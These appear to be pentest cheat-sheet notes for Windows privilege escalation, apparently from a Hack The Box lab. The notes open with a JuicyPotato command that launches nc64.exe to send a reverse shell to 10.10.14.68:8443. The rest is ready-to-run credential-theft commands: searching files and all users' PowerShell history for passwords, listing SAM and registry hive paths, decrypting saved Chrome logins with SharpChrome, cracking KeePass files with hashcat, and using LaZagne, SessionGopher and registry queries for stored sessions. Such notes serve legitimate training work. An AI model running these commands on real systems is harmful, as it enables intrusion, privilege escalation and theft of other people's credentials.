# Windows Privilege Escalation
## JuciyPotato (successfully ran command with parameters)
<pre>
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc64.exe 10.10.14.68 8443 -e cmd.exe" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
</pre>
## Credential Theft
<pre>
# Searching for Files
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Chrome Dictionary Files
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Unattend files (anywhere in the system)
Unattend.xml


# Reading PowerShell History File
# get ps history location
PS C:\htb> (Get-PSReadLineOption).HistorySavePath
# read ps history file
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
# read ps history files of all users
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

 
# Search File Contents for String - Example 1
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

# Search File Contents for String - Example 2
C:\htb> findstr /si password *.xml *.ini *.txt *.config

# Search File Contents for String - Example 3
C:\htb> findstr /spin "password" *.*


# Search File Contents with PowerShell
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password


# Search for File Extensions - Example 1
C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*


# Search for File Extensions - Example 2
C:\htb> where /R C:\ *.config

# Search for File Extensions Using PowerShell
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore


# Looking for StickyNotes DB Files (can be opened in DbBrowserForSqlLite)
PS C:\htb> ls
 
 
    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal

# Other Interesting Files
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*


# Listing Saved Credentials
C:\htb> cmdkey /list

# Run Commands as Another User
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"


# Retrieving Saved Credentials from Chrome
https://github.com/GhostPack/SharpDPAPI
PS C:\htb> .\SharpChrome.exe logins /unprotect

# Password Managers (.kdbx files)
mrFiSHER@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Email
https://github.com/dafthack/MailSniper

# Lazagne
PS C:\htb> .\lazagne.exe all

# SesssionGopher
PS C:\htb> Import-Module .\SessionGopher.ps1 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

# Enumerating Autologon with reg.exe
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Enumerating Sessions and Finding Credentials:
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
</pre>
